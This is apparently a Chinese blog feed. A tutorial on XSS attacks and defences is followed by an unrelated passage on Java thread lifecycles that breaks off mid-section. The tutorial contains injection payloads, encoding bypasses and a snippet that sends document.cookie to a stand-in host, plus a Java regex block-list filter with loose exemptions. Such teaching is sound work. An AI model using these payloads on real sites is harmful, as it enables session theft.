&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;    &lt;head&gt;        &lt;meta charset="UTF-8" /&gt;        &lt;title&gt;demo&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div&gt;            output:            &lt;input id="out" /&gt;            &lt;a id="jump"&gt;jump&lt;/a&gt;        &lt;/div&gt;        &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;        &lt;script&gt;            $(function() {                var $jump = $('#jump');                var $output = $('#out');                var $submit = $('#submit');                function getQueryString(name) {                    var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i');                    var r = window.location.search.substr(1).match(reg);                    if (r != null) return unescape(r[2]);                    return null;                }                var val = getQueryString('redirect_to');        $output.val(val)                $jump.attr('href', val);            });        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;
完整源码可以查看demo3
A发现一个漏洞,然后发了这个网址给其他人打开
https://www.test.com/?redirect_to=javascript:alert('XSS')
当他们点击跳转的时候就会触发A故意形成的恶意代码

像这种情况B第一想法是检验是否网址格式再渲染界面,所以他这么写
function testUrl(str) {  var Expression =    '^((https|http|ftp|rtsp|mms)?://)?' +    '(([0-9a-z_!~*().&amp;=+$%-]+: )?[0-9a-z_!~*().&amp;=+$%-]+@)?' + //ftp的user@    '(([0-9]{1,3}.){3}[0-9]{1,3}|' + // IP形式的URL- 199.194.52.184    '([0-9a-z_!~*()-]+.)*' + // 域名- www.    '[a-z]{2,6})' + //域名的扩展名    '(:[0-9]{1,4})?' + // 端口- :80    '((/?)|(/[0-9a-z_!~*().;?:@&amp;=+$,%#-]+)+/?)$';  var objExp = new RegExp(Expression);  if (objExp.test(str) != true) {    return false;  } else {    return true;  }}var val = getQueryString('redirect_to');$output.val(val);testUrl(val) &amp;&amp; $jump.attr('href', val);
完整源码可以查看demo4
因为富文本有问题,只能截图.
但是不是每个a标签都是用于跳转页面的,例如通过Scheme协议打开APP界面
&lt;a href="Scheme协议"&gt;
这样子你就把其他非属性跳转的用法都干掉了,所以B想了想不妥,还是换一种方式禁止,直接判断执行前缀
var val = getQueryString('redirect_to');var reg = /javascript:/gi;$output.val(val);!reg.test(val) &amp;&amp; $jump.attr('href', val);
完整源码可以查看demo5
因为浏览器不区分大小写,所以需要注意一下.更新版本之后B以为已经堵死这条路了,殊不知A换个方式改成编码或者回车空格等
https://www.test.com/?redirect_to=jav ascript:alert('XSS');https://www.test.com/?redirect_to=javascrip?74:alert('XSS');
这就尴尬了,虽然浏览器并不会执行,但是这些也能完全避开B的拦截规则,也可能会引起其他隐患
还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用
&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;    &lt;head&gt;        &lt;meta charset="UTF-8" /&gt;        &lt;title&gt;demo&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div&gt;            output:            &lt;input id="out" /&gt;        &lt;/div&gt;        &lt;script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"&gt;&lt;/script&gt;        &lt;script&gt;            $(function() {                var $output = $('#out');                function getQueryString(name) {                    var reg = new RegExp('(^|&amp;)' + name + '=([^&amp;]*)(&amp;|$)', 'i');                    var r = window.location.search.substr(1).match(reg);                    if (r != null) return unescape(r[2]);                    return null;                }                var val = JSON.parse(getQueryString('data'));                $output.val(val.data).html(val.data);            });        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;
完整源码可以查看demo6
A可以直接修改URL参数注入代码
https://www.test.com/?data={"data":"&lt;script&gt;alert(\"XSS\")&lt;/script&gt;"}

A通过恶意脚本在页面插入图片自动发起恶意请求
var img = document.createElement('img');img.src =  'http://www.test.com/cheat.html?url=' +  escape(window.location.href) +  '&amp;content=' +  escape(document.cookie);img.style = 'display:none';document.body.appendChild(img);
完整源码可以查看demo7
B让服务端采用了比较简单的办法使用httponly禁止JS脚本访问cookies信息让A无法拿到
A通过事件注入恶意脚本
var img = document.createElement('img');img.src = '#';img.onerror = document.body.appendChild(document.createElement('script')).src =  'http://www.test.com/cheat.js';img.style = 'display:none';document.body.appendChild(img);
完整源码可以查看demo8
当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。可以让服务端限制必须是白名单才能通过请求达到防盗链功能,但是丢失Refere情况比较多,而且容易被恶意修改,所以大多只适用于资源被恶意引用的情况
A利用浏览器的解码顺序进行混合编码组装
当浏览器进行绘制时，解码顺序分别为 HTML &gt; URL &gt; JS,所以A构造了这么一段代码
&lt;a href="javascript&amp;#58;alert('\&lt;%E6%B5%8B%E8%AF%95\&gt;')"&gt;jump&lt;/a&gt;
首先是 HTML 解码，结果为
&lt;a href="javascript:alert('\&lt;%E6%B5%8B%E8%AF%95\&gt;')"&gt;jump&lt;/a&gt;
然后是 URL 解码，结果为
&lt;a href="javascript:alert('\&lt;测试\&gt;')"&gt;jump&lt;/a&gt;
最后是 JS 解码，结果为
&lt;a href="javascript:alert('&lt;测试&gt;')"&gt;jump&lt;/a&gt;
所以可以攻击的方式很多种,相比于针对处理我们应该先了解相关的攻击方式
XSS攻击方式


所有用户输入内容都有潜在的风险


利用script标签注入HTML/Javascript代码


利用拥有href和src等属性的标签


利用空格、回车和Tab等拼接方式绕开拦截


利用字符编码绕开拦截（JS支持unicode、eacapes、十六进制、十进制等编码形式）


利用onload,onscroll等事件执行恶意代码


利用样式属性backgrund-image等执行(听说主流浏览器已处理)


URL参数


Cookies


请求header的referer


恶意代码拆分组装


各种API
// URL相关document.locationdocument.URLdocument.URLUnencodeddocument.referrerwindow.location// 操作domdocument.write()document.writeln()document.boby.innerHtml// 特殊函数eval()window.execScript()window.setInterval()window.setTimeout()// 重定向document.locationdocument.URLdocument.open()window.location.hrefwindow.navigate()window.open


总的来说分两种类型:

攻击者手动提交恶意代码
浏览器自动执行恶意代码

防御


针对上面的案例如果B选择前端进行内容转义,会引起什么问题呢?
如果攻击者不直接经过前端界面,而是直接自己构造请求就可以破解了


但是B是在发送请求之前转义又会有什么问题?
如果是需要用于界面展示的话,引用到字段的地方都需要处理,大部分模板都会自动转义处理,但是如果用在JS不能直接使用或者计算,例如长度判断等
需要根据上下文采用不同的转义规则增大处理难度,如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等,所以这更适用于固定类型的内容,例如URL,号码等


XSS Filter

用户提交数据进行验证,只接受限定长度/内容
表单数据指定具体类型
过滤移除特殊的html标签,script和iframe等
过滤移除特殊的Javascript代码,javascript:和事件等

HTML Entity(举例部分)



符号
实体编号




&lt;
&lt;


&gt;
&gt;


&amp;
&amp;


"
"


’
'


空格
&nbsp;



请求限制

将重要的Cookie标记为HTTP Only,不能通过客户端脚本读取和修改
设置referer防止恶意请求
实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行

防御实现代码举例
&lt;!-- 非法参数过滤器 --&gt;	&lt;filter&gt;		&lt;filter-name&gt;IllegalCharacterFilter&lt;/filter-name&gt;		&lt;filter-class&gt;com.hots.ssp.common.safety.IllegalCharacterFilter&lt;/filter-class&gt;		&lt;init-param&gt;			&lt;!-- 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀 及全路径，多个配置用逗号分隔 --&gt;			&lt;param-name&gt;excludedPaths&lt;/param-name&gt;			&lt;param-value&gt;/images/*,*.jsp, *.css, *.ico&lt;/param-value&gt;		&lt;/init-param&gt;	&lt;/filter&gt;	&lt;filter-mapping&gt;		&lt;filter-name&gt;IllegalCharacterFilter&lt;/filter-name&gt;		&lt;url-pattern&gt;/*&lt;/url-pattern&gt;	&lt;/filter-mapping&gt;
package com.dayainfo.ssp.common.safety;import org.springframework.util.StringUtils;import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.util.concurrent.atomic.AtomicBoolean;public class IllegalCharacterFilter implements Filter {    /**     * 不需要被过滤器拦截的页面 ，主要用于静态资源的放行     * 在web.xml中配置filter的init-param     */    private String excludedPaths;    private String[] excludedPathArray;    @Override    public void init(FilterConfig filterConfig) throws ServletException {        // 初始化时读取web.xml中配置的init-param        excludedPaths = filterConfig.getInitParameter("excludedPaths");        if (!StringUtils.isEmpty(excludedPaths)) {            excludedPathArray = excludedPaths.split(",");        }    }    @Override    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {        HttpServletRequest request = (HttpServletRequest) req;        HttpServletResponse resp = (HttpServletResponse) res;        request.setCharacterEncoding("utf-8");        String url = request.getServletPath();// 要访问的url        // 判断是否是直接放行的请求        if (url.contains("/overtime") || isFilterExcludeRequest(request)) {            // 会丢参的访问            chain.doFilter(request, res);        } else {            // 非法请求检查            AtomicBoolean checkIllegal = new AtomicBoolean();            // 添加X-Frame-Options响应头            resp.setCharacterEncoding("utf-8");            resp.addHeader("X-Frame-Options", "SAMEORIGIN");            resp.addHeader("X-Download-Options", "noopen");            resp.addHeader("X-Permitted-Cross-Domain-Policies", "master-only");            resp.setHeader("strict-transport-security", "max-age=16070400; includeSubDomains");            resp.addHeader("Referrer-Policy", "no-referrer-when-downgrade");            resp.addHeader("Set-Cookie", "cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");            request = new MHttpServletRequest(request, checkIllegal);            if (checkIllegal.get()) {                // 非法请求拦截                resp.sendRedirect("/publicUser/overtime?state=100011");            }            chain.doFilter(request, resp);        }    }    @Override    public void destroy() {    }    /**     * 54     * 判断是否是 过滤器直接放行的请求     * 55     * &lt;br/&gt;主要用于静态资源的放行     *     * @return 58     */    private boolean isFilterExcludeRequest(HttpServletRequest request) {        if (null != excludedPathArray &amp;&amp; excludedPathArray.length &gt; 0) {            String url = request.getServletPath();            for (String ecludedUrl : excludedPathArray) {                if (ecludedUrl.startsWith("*.")) {                    // 如果配置的是后缀匹配, 则把前面的*号干掉，然后用endWith来判断                    if (url.endsWith(ecludedUrl.substring(1))) {                        return true;                    }                } else if (ecludedUrl.endsWith("/*")) {                    if (!ecludedUrl.startsWith("/")) {                        // 前缀匹配，必须要是/开头                        ecludedUrl = "/" + ecludedUrl;                    }                    // 如果配置是前缀匹配, 则把最后的*号干掉，然后startWith来判断                    String prffixStr = request.getContextPath() + ecludedUrl.substring(0, ecludedUrl.length() - 1);                    if (url.startsWith(prffixStr)) {                        return true;                    }                } else {                    // 如果不是前缀匹配也不是后缀匹配,那就是全路径匹配                    if (!ecludedUrl.startsWith("/")) {                        // 全路径匹配，也必须要是/开头                        ecludedUrl = "/" + ecludedUrl;                    }                    String targetUrl = request.getContextPath() + ecludedUrl;                    if (url.equals(targetUrl)) {                        return true;                    }                }            }        }        return false;    }}
package com.dayainfo.ssp.common.safety;import com.dayainfo.ssp.common.safety.util.XssShieldUtil;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper;import java.util.concurrent.atomic.AtomicBoolean;public class MHttpServletRequest extends HttpServletRequestWrapper {    // 非法请求标记，存在注入嫌疑，禁止访问    private final AtomicBoolean checkIllegal;    public MHttpServletRequest(HttpServletRequest request, AtomicBoolean checkIllegal) {        super(request);        this.checkIllegal = checkIllegal;        doParamFilter();    }    @Override    public String getParameter(String name) {        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);        // 返回值之前 先进行过滤        final String value = super.getParameter(nameFilter);        return XssShieldUtil.stripXss(nameFilter, value, checkIllegal);    }    @Override    public String[] getParameterValues(String name) {        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);        // 返回值之前 先进行过滤        String[] values = super.getParameterValues(nameFilter);        if (values != null) {            for (int i = 0; i &lt; values.length; i++) {                values[i] = XssShieldUtil.stripXss(nameFilter, values[i], checkIllegal);            }        }        return values;    }    public void doParamFilter() {        for (String name : this.getParameterMap().keySet()){            this.getParameterValues(name);        }    }}
package com.dayainfo.ssp.common.safety.util;import com.alibaba.fastjson.JSON;import com.dayainfo.ssp.common.safety.constant.SafeFilterConstant;import com.dayainfo.ssp.common.util.EscapeUnescape;import com.dayainfo.ssp.common.util.StringUtil;import javafx.util.Pair;import org.apache.commons.lang.StringUtils;import org.junit.Test;import java.io.*;import java.net.URLDecoder;import java.util.ArrayList;import java.util.List;import java.util.Locale;import java.util.concurrent.atomic.AtomicBoolean;import java.util.regex.Matcher;import java.util.regex.Pattern;/** * 处理非法字符 */public class XssShieldUtil {    static String decodeParam(String value) {        try {            if (StringUtils.isEmpty(value)) {                return value;            }            int totalCount = 2;            while (value.contains("%") &amp;&amp; --totalCount &gt; 0) {                value = URLDecoder.decode(value, "UTF-8");            }        } catch (Exception e) {            if (e.getClass().getName().contains("NumberFormatException") &amp;&amp; value.contains("%")) {                value = value.replaceAll("%", "");            }        }        if (value.contains("%")) {            try {                int totalCount = 2;                while (value.contains("%") &amp;&amp; --totalCount &gt; 0) {                    value = EscapeUnescape.unescape(value);                }            } catch (Exception e) {            }        }        if (value.contains("%")) {            System.out.printf("【decode失败】：%s\n", value);        }        return value;    }    static boolean checkFilter(String name) {        return !StringUtils.isEmpty(name) &amp;&amp; SafeFilterConstant.noFilterList.contains(name);    }    public static String stripXss(String name, String value, AtomicBoolean checkIllegal) {        if (checkFilter(name)) {            return value;        }        return stripXss(value, checkIllegal);    }    /**     * 过滤清理     */    public static String stripXss(String value, AtomicBoolean checkIllegal) {        final String tmpValue = value;        // URLDecode        value = decodeParam(value);        // 放行        if (checkFilter(value)) {            return value;        }        if (StringUtils.isEmpty(value)) {            return value;        }        if (patternToEmpty(value)) {            // 非法请求，禁止访问            checkIllegal.set(true);            return null;        }        // JSON数据通过验证        if (isJson(value)) {            return value;        }        // 过滤危险字符        value = patternToReplace(value);        if (tmpValue != null &amp;&amp; !tmpValue.equals(value)) {            System.out.printf("【%s】----【%s】\n", tmpValue, value);        }        return value;    }    /**     * 验证是否直接清理参数内容     *     * @param value     * @return     */    static boolean patternToEmpty(String value) {        Matcher matcher = null;        final String testValue = value.toLowerCase(Locale.ROOT);        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_DELETE) {            matcher = pattern.matcher(testValue);            while (matcher.find()) {                if (StringUtil.isEmpty(matcher.group())) {                    continue;                }                return true;            }        }        return false;    }    /**     * 验证是否直接替换参数内容     *     * @param value     * @return     */    static String patternToReplace(String value) {        Matcher matcher = null;        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_REPLACE_TO_EMPTY) {            matcher = pattern.matcher(value);            // 匹配            if (matcher.find()) {                // 删除相关字符串                value = matcher.replaceAll("");            }        }        return value;    }    public static boolean isJson(String json) {        boolean result = false;        final String testJson = json.toLowerCase(Locale.ROOT);        // JSON数据通过验证        if (testJson.contains("/${")) {            return false;        }        if ((json.contains("{") &amp;&amp; json.contains("}")) || (json.contains("[") &amp;&amp; json.contains("]"))) {            try {                JSON.parse(json);                result = true;            } catch (Exception e) {                System.out.println("JSON数据被拦截：" + json);                result = false;            }        }        return result;    }}
package com.dayainfo.ssp.common.safety.util;import java.util.ArrayList;import java.util.List;import java.util.regex.Pattern;/** * @author: DH * @date: 2022/4/20 * @desc: */public final class XssPatternGroup {    static final List&lt;Pattern&gt; LIST_PATTERNS_DELETE = new ArrayList&lt;&gt;();    static final List&lt;Pattern&gt; LIST_PATTERNS_REPLACE_TO_EMPTY = new ArrayList&lt;&gt;();    static {        for (Object[] arr : getXssPatternToNullList()) {            LIST_PATTERNS_DELETE.add(Pattern.compile((String) arr[0], (Integer) arr[1]));        }        for (Object[] arr : getXssPatternToEmptyList()) {            LIST_PATTERNS_REPLACE_TO_EMPTY.add(Pattern.compile((String) arr[0], (Integer) arr[1]));        }    }    /**     * 正则匹配上：清空参数所有内容     *     * @return     */    private static List&lt;Object[]&gt; getXssPatternToNullList() {        List&lt;Object[]&gt; ret = new ArrayList&lt;Object[]&gt;();        ret.add(new Object[]{"&lt;(\\S*)(no)?script|&lt;/(\\S*)(no)?script|&lt;(\\S*)iframe|&lt;(\\S*)img|&lt;(\\S*)svg|&lt;(\\S*)audio|\\.html", Pattern.CASE_INSENSITIVE});        ret.add(new Object[]{"window\\.location|window\\.|\\.location|document\\.cookie|document\\.write|document\\.|alert\\(.*?\\)|window\\.open\\(*", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"javascript:|vbscript:|view-source:", Pattern.CASE_INSENSITIVE});        ret.add(new Object[]{"( href=)|( src=)|(=wrtice\\()", Pattern.CASE_INSENSITIVE});        ret.add(new Object[]{"&lt;+\\s*\\w*\\s*(oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)+\\s*=+", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        return ret;    }    /**     * 正则匹配上：清空参数匹配项     */    private static List&lt;Object[]&gt; getXssPatternToEmptyList() {        List&lt;Object[]&gt; ret = new ArrayList&lt;Object[]&gt;();        ret.add(new Object[]{"expression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"&lt;(\"[^\"]*\"|\'[^\']*\'|[^\'\"&gt;])*&gt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"&amp;.*?|$.*?|CR.*?|LF.*?|\\.*?", Pattern.CASE_INSENSITIVE});        ret.add(new Object[]{"%22", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%27", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%3E", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%3e", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%3C", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%3c", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"&lt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"&gt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"%", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"$", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\"", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\'", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\"", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"'", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\\+", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\\\\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\\(", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{" and ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{" or ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{" 1=1 ", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        ret.add(new Object[]{"(\\bhref(?=\\s*=\\s*['\"]?\\s*javascript:))|(\\bdata(?!:\\s*image/))|(^[^&lt;]*&lt;(?=/textarea\\s*&gt;))|(&lt;(?=(script)|(/script)))|(\\b(onafterprint|onbeforeprint|onbeforeunload|onerror|onhaschange|onload|onmessage|onoffline|ononline|onpagehide|onpageshow|onpopstate|onredo|onresize|onstorage|onundo|onunload|onblur|onchange|oncontextmenu|onfocus|onformchange|onforminput|oninput|oninvalid|onreset|onreset|onsubmit|onkey\\w*|onclick|ondblclick|ondrag\\w*|ondrop|onmouse\\w*|onscroll|ontouch\\w*)(?=(\\s*)=))", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});        return ret;    }}
public class SafeFilterConstant {    public static final List&lt;String&gt; noFilterList = new ArrayList();    static {        noFilterList.add("res_create_user_id");        noFilterList.add("(.*?)DataListStr(.*?)");        noFilterList.add("proc_dxid");        noFilterList.add("userName");        noFilterList.add("password");        noFilterList.add("sortParam");    }}
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM基础回顾</title>
    <url>/20221027/6cd20d81.html</url>
    <content><![CDATA[线程生命周期
当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。在线程的生命周期中，它要经过 新建（New）、就绪（Runnable）、运行（Running）、阻塞（Blocked）和死亡（Dead）5种状态。尤其是当线程启动以后，它不可能一直"霸占"着CPU独自运行，所以CPU需要在多条线程之间切换，于是 线程状态也会多次在运行、阻塞之间切换。
0. 生命周期图

1. 新建（New）状态
当程序使用new关键字创建了一个线程之后，该线程就处于 新建状态，此时的线程情况如下：

此时JVM为其分配内存，并初始化其成员变量的值；
此时线程对象没有表现出任何线程的动态特征，程序也不会执行线程的线程执行体；

2. 就绪（Runnable）状态

此时JVM会为其创建方法调用栈和程序计数器；
该状态的线程一直处于线程就绪队列（尽管是采用队列形式，事实上，把它称为可运行池而不是可运行队列。因为CPU的调度不一定是按照先进先出的顺序来调度的），线程并没有开始运行；
此时线程等待系统为其分配CPU时间片，并不是说执行了start()方法就立即执行；

调用start()方法与run()方法对比


调用start()方法来启动线程，系统会把该run()方法当成线程执行体来处理。


直接调用线程对象的run()方法，则run()方法立即就会被执行，而且在run()方法返回之前其他线程无法并发执行。也就是说，系统把线程对象当成一个普通对象，而run()方法也是一个普通方法，而不是线程执行体；


需要指出的是，调用了线程的run()方法之后，该线程已经不再处于新建状态，不要再次调用线程对象的start()方法。只能对处于新建状态的线程调用start()方法，否则将引发==IllegaIThreadStateExccption==异常；


如何让子线程调用start()方法之后立即执行而非"等待执行"：
程序可以使用Thread.sleep(1) 来让当前运行的线程（主线程）睡眠1毫秒，1毫秒就够了，因为在这1毫秒内CPU不会空闲，它会去执行另一个处于就绪状态的线程，这样就可以让子线程立即开始执行；
3. 运行（Running）状态
当CPU开始调度处于 就绪状态 的线程时，此时线程获得了CPU时间片才得以真正开始执行run()方法的线程执行体，则该线程处于 运行状态。
如果计算机只有一个CPU，那么在任何时刻只有一个线程处于运行状态；如果在一个多处理器的机器上，将会有多个线程并行执行，处于运行状态；当线程数大于处理器数时，依然会存在多个线程在同一个CPU上轮换的现象；
处于运行状态的线程最为复杂，它 不可能一直处于运行状态（除非它的线程执行体足够短，瞬间就执行结束了），线程在运行过程中需要被中断，目的是使其他线程获得执行的机会，线程调度的细节取决于底层平台所采用的策略。线程状态可能会变为 阻塞状态、就绪状态和死亡状态。比如：


对于采用 抢占式策略 的系统而言，系统会给每个可执行的线程分配一个时间片来处理任务；当该时间片用完后，系统就会剥夺该线程所占用的资源，让其他线程获得执行的机会。线程就会又 从运行状态变为就绪状态，重新等待系统分配资源；


对于采用 协作式策略的系统而言，只有当一个线程调用了它的yield()方法后才会放弃所占用的资源—也就是必须由该线程主动放弃所占用的资源，线程就会又 从运行状态变为就绪状态。


4. 阻塞（Blocked）状态
处于运行状态的线程在某些情况下，让出CPU并暂时停止自己的运行，进入 阻塞状态。
线程将会进入阻塞状态可能原因


线程调用sleep()方法，主动放弃所占用的处理器资源，暂时进入中断状态（不会释放持有的对象锁），时间到后等待系统分配CPU继续执行；


线程调用一个阻塞式IO方法，在该方法返回之前，该线程被阻塞；


线程试图获得一个同步监视器，但该同步监视器正被其他线程所持有;


程序调用了线程的suspend方法将线程挂起；


线程调用wait，等待notify/notifyAll唤醒时(会释放持有的对象锁)；


阻塞状态分类


等待阻塞：运行状态中的 线程执行wait()方法，使本线程进入到等待阻塞状态；


同步阻塞：线程在 获取synchronized同步锁失败（因为锁被其它线程占用），它会进入到同步阻塞状态；


其他阻塞：通过调用线程的 sleep()或join()或发出I/O请求 时，线程会进入到阻塞状态。当 sleep()状态超时、join()等待线程终止或者超时、或者I/O处理完毕 时，线程重新转入就绪状态；


在阻塞状态的线程只能进入就绪状态，无法直接进入运行状态。而就绪和运行状态之间的转换通常不受程序控制，而是由系统线程调度所决定。当处于就绪状态的线程获得处理器资源时，该线程进入运行状态；当处于运行状态的线程失去处理器资源时，该线程进入就绪状态。
但有一个方法例外，调用yield()方法可以让运行状态的线程转入就绪状态。
4.1 无限等待（WAITING）状态
线程处于 无限制等待状态，等待一个特殊的事件来重新唤醒，如：


通过wait()方法进行等待的线程等待一个notify()或者notifyAll()方法；
通过join()方法进行等待的线程等待目标线程运行结束而唤醒；


以上两种一旦通过相关事件唤醒线程，线程就进入了 就绪（RUNNABLE）状态 继续运行。
4.2 时限等待（TIMED_WAITING）状态
线程进入了一个 时限等待状态，如：sleep(3000)，等待3秒后线程重新进行 就绪（RUNNABLE）状态 继续运行。
5. 死亡（Dead）状态
线程会以如下3种方式结束，结束后就处于 死亡状态：


run()或call()方法执行完成，线程正常结束（TERMINATED状态）


线程抛出一个未捕获的Exception或Error；


直接调用该线程stop()方法来结束该线程（该方法容易导致死锁，通常不推荐使用）


处于死亡状态的线程对象也许是活的，但是，它已经不是一个单独执行的线程。线程一旦死亡，就不能复生。 如果在一个死去的线程上调用start()方法，会抛出java.lang.IllegalThreadStateException异常。所以，需要注意的是：一旦线程通过start()方法启动后就再也不能回到新建（NEW）状态，线程终止后也不能再回到就绪（RUNNABLE）状态。
5.1 终止（TERMINATED）状态
线程执行完毕后，进入终止（TERMINATED）状态。
6. 线程相关方法
public class Thread{    // 线程的启动    public void start();     // 线程体    public void run();     // 已废弃    public void stop();     // 已废弃    public void resume();     // 已废弃    public void suspend();     // 在指定的毫秒数内让当前正在执行的线程休眠    public static void sleep(long millis);     // 同上，增加了纳秒参数    public static void sleep(long millis, int nanos);     // 测试线程是否处于活动状态    public boolean isAlive();     // 中断线程    public void interrupt();     // 测试线程是否已经中断    public boolean isInterrupted();     // 测试当前线程是否已经中断    public static boolean interrupted();     // 等待该线程终止    public void join() throws InterruptedException;     // 等待该线程终止的时间最长为 millis 毫秒    public void join(long millis) throws InterruptedException;     // 等待该线程终止的时间最长为 millis 毫秒 + nanos 纳秒    public void join(long millis, int nanos) throws InterruptedException; }
6.1 线程就绪、运行和死亡状态转换

就绪状态转换为运行状态：此线程得到CPU资源；
运行状态转换为就绪状态：此线程主动调用yield()方法或在运行过程中失去CPU资源。
运行状态转换为死亡状态：此线程执行执行完毕或者发生了异常；

注意：
当调用线程中的yield()方法时，线程从运行状态转换为就绪状态，但接下来CPU调度就绪状态中的那个线程具有一定的随机性，因此，可能会出现A线程调用了yield()方法后，接下来CPU仍然调度了A线程的情况。
6.2 run &amp; start
通过调用start启动线程，线程执行时会执行run方法中的代码。
start()：线程的启动；run()：线程的执行体；
6.3 sleep &amp; yield
sleep()
通过sleep(millis)使线程进入休眠一段时间，该方法在指定的时间内无法被唤醒，同时也不会释放对象锁。sleep是静态方法，最好不要用Thread的实例对象调用它，因为它睡眠的始终是当前正在运行的线程，而不是调用它的线程对象，它只对正在运行状态的线程对象有效Java线程调度是Java多线程的核心，只有良好的调度，才能充分发挥系统的性能，提高程序的执行效率。但是不管程序员怎么编写调度，只能最大限度的影响线程执行的次序，而不能做到精准控制。因为使用sleep方法之后，线程是进入阻塞状态的，只有当睡眠的时间结束，才会重新进入到就绪状态，而就绪状态进入到运行状态，是由系统控制的，我们不可能精准的去干涉它，所以如果调用Thread.sleep(1000)使得线程睡眠1秒，可能结果会大于1秒。
yield()
